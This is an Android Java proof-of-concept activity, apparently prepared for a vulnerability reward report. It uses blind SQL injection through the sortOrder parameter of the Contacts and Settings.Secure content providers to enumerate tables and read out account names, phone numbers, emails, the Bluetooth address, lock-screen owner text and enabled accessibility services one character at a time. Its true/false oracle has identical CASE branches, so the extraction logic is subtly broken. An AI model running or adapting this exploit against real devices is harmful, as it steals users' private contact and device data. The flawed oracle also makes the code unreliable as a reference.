package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class ContactsSortBlindActivity extends Activity {
    private static final String TAG = "ContactsSortBlind";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(7);
        logView.setText("ContactsProvider sortOrder Blind SQLi\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        enumerateSchema();
        extractAccountInfo();
        extractPhoneNumbers();
        extractEmails();
        extractNotes();
        testSettingsBlindExtraction();
        log("\n=== ALL BLIND EXTRACTION TESTS COMPLETE ===");
    }

    private void enumerateSchema() {
        log("=== PHASE 1: Schema Enumeration via sortOrder ===\n");

        // Count tables
        int tableCount = blindCount(
            "content://com.android.contacts/contacts",
            "(SELECT count(*) FROM sqlite_master WHERE type='table')"
        );
        log("[SCHEMA] Table count: " + tableCount);

        // Extract table names character by character
        String[] knownTables = {"accounts", "raw_contacts", "data", "calls", "mimetypes",
            "groups", "phone_lookup", "name_lookup", "contacts", "agg_exceptions",
            "settings", "status_updates", "directories", "pre_authorized_uris",
            "visible_contacts", "default_directory", "search_index"};

        for (String table : knownTables) {
            boolean exists = blindBoolean(
                "content://com.android.contacts/contacts",
                "(SELECT count(*) FROM sqlite_master WHERE type='table' AND name='" + table + "')>0"
            );
            if (exists) {
                log("[SCHEMA] Table exists: " + table);
            }
        }

        // Count rows in accounts table
        int accountRows = blindCount(
            "content://com.android.contacts/contacts",
            "(SELECT count(*) FROM accounts)"
        );
        log("[SCHEMA] accounts table rows: " + accountRows);

        // Count rows in raw_contacts
        int rawContactRows = blindCount(
            "content://com.android.contacts/contacts",
            "(SELECT count(*) FROM raw_contacts)"
        );
        log("[SCHEMA] raw_contacts rows: " + rawContactRows);

        // Count rows in data table
        int dataRows = blindCount(
            "content://com.android.contacts/contacts",
            "(SELECT count(*) FROM data)"
        );
        log("[SCHEMA] data table rows: " + dataRows);

        // Check for pre_authorized_uris table
        boolean hasPreAuth = blindBoolean(
            "content://com.android.contacts/contacts",
            "(SELECT count(*) FROM sqlite_master WHERE name='pre_authorized_uris')>0"
        );
        log("[SCHEMA] pre_authorized_uris exists: " + hasPreAuth);

        if (hasPreAuth) {
            int preAuthCount = blindCount(
                "content://com.android.contacts/contacts",
                "(SELECT count(*) FROM pre_authorized_uris)"
            );
            log("[SCHEMA] pre_authorized_uris rows: " + preAuthCount);
        }
    }

    private void extractAccountInfo() {
        log("\n=== PHASE 2: Account Data Extraction ===\n");

        // Get account_name from accounts table
        int accountCount = blindCount(
            "content://com.android.contacts/contacts",
            "(SELECT count(*) FROM accounts)"
        );

        for (int i = 0; i < Math.min(accountCount, 3); i++) {
            String name = blindExtractString(
                "content://com.android.contacts/contacts",
                "(SELECT account_name FROM accounts LIMIT 1 OFFSET " + i + ")",
                50
            );
            String type = blindExtractString(
                "content://com.android.contacts/contacts",
                "(SELECT account_type FROM accounts LIMIT 1 OFFSET " + i + ")",
                50
            );
            log("[EXTRACT] Account #" + i + ": name=" + name + " type=" + type);
        }
    }

    private void extractPhoneNumbers() {
        log("\n=== PHASE 3: Phone Number Extraction via sortOrder ===\n");

        // Count phone number entries (mimetype_id for phone is typically 5)
        // First find the mimetype_id for phone
        int phoneCount = blindCount(
            "content://com.android.contacts/contacts",
            "(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/phone_v2'))"
        );
        log("[EXTRACT] Phone number entries: " + phoneCount);

        // Extract phone numbers
        for (int i = 0; i < Math.min(phoneCount, 5); i++) {
            String phone = blindExtractString(
                "content://com.android.contacts/contacts",
                "(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/phone_v2') LIMIT 1 OFFSET " + i + ")",
                15
            );
            log("[EXTRACT] Phone #" + i + ": " + phone);
        }
    }

    private void extractEmails() {
        log("\n=== PHASE 4: Email Extraction via sortOrder ===\n");

        int emailCount = blindCount(
            "content://com.android.contacts/contacts",
            "(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/email_v2'))"
        );
        log("[EXTRACT] Email entries: " + emailCount);

        for (int i = 0; i < Math.min(emailCount, 5); i++) {
            String email = blindExtractString(
                "content://com.android.contacts/contacts",
                "(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/email_v2') LIMIT 1 OFFSET " + i + ")",
                40
            );
            log("[EXTRACT] Email #" + i + ": " + email);
        }
    }

    private void extractNotes() {
        log("\n=== PHASE 5: Notes Extraction via sortOrder ===\n");

        int noteCount = blindCount(
            "content://com.android.contacts/contacts",
            "(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/note'))"
        );
        log("[EXTRACT] Note entries: " + noteCount);
    }

    private void testSettingsBlindExtraction() {
        log("\n=== PHASE 6: Settings.Secure Blind Extraction ===\n");

        // Extract bluetooth_address
        String btAddr = blindExtractString(
            "content://settings/secure",
            "(SELECT value FROM secure WHERE name='bluetooth_address')",
            17
        );
        log("[EXTRACT] bluetooth_address: " + btAddr);

        // Extract lock_screen_owner_info
        String lockInfo = blindExtractString(
            "content://settings/secure",
            "(SELECT value FROM secure WHERE name='lock_screen_owner_info')",
            30
        );
        log("[EXTRACT] lock_screen_owner_info: " + lockInfo);

        // Extract enabled_accessibility_services
        String accessSvc = blindExtractString(
            "content://settings/secure",
            "(SELECT value FROM secure WHERE name='enabled_accessibility_services')",
            50
        );
        log("[EXTRACT] enabled_accessibility_services: " + accessSvc);

        // Count total secure settings
        int secureCount = blindCount(
            "content://settings/secure",
            "(SELECT count(*) FROM secure)"
        );
        log("[EXTRACT] Total secure settings: " + secureCount);
    }

    private boolean blindBoolean(String uri, String condition) {
        try {
            Cursor cTrue = getContentResolver().query(
                Uri.parse(uri),
                new String[]{"_id"},
                null, null,
                "CASE WHEN " + condition + " THEN _id ELSE _id END ASC"
            );
            if (cTrue != null) {
                cTrue.close();
                return true;
            }
        } catch (Exception e) {
            // Query failed = condition syntax error or table doesn't exist
        }
        return false;
    }

    private int blindCount(String uri, String subquery) {
        // Binary search for count value
        int lo = 0, hi = 10000;
        // First check if > 0
        if (!blindBoolean(uri, subquery + ">0")) return 0;
        // Binary search
        while (lo < hi) {
            int mid = (lo + hi + 1) / 2;
            if (blindBoolean(uri, subquery + ">=" + mid)) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
            if (hi - lo <= 1) {
                if (blindBoolean(uri, subquery + "=" + hi)) return hi;
                return lo;
            }
        }
        return lo;
    }

    private String blindExtractString(String uri, String subquery, int maxLen) {
        StringBuilder result = new StringBuilder();
        // First get length
        int len = blindCount(uri, "(SELECT length(" + subquery + "))");
        if (len == 0) return "(empty)";
        len = Math.min(len, maxLen);

        for (int pos = 1; pos <= len; pos++) {
            int charCode = blindExtractChar(uri, subquery, pos);
            if (charCode > 0 && charCode < 128) {
                result.append((char) charCode);
            } else {
                result.append('?');
            }
            // Log progress every 10 chars
            if (pos % 10 == 0) {
                log("  ... extracting char " + pos + "/" + len);
            }
        }
        return result.toString();
    }

    private int blindExtractChar(String uri, String subquery, int pos) {
        // Binary search for unicode(substr(value, pos, 1))
        String charExpr = "(SELECT unicode(substr(" + subquery + "," + pos + ",1)))";
        int lo = 32, hi = 126; // printable ASCII
        while (lo < hi) {
            int mid = (lo + hi + 1) / 2;
            if (blindBoolean(uri, charExpr + ">=" + mid)) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }
        // Verify
        if (blindBoolean(uri, charExpr + "=" + lo)) return lo;
        return 0;
    }
}
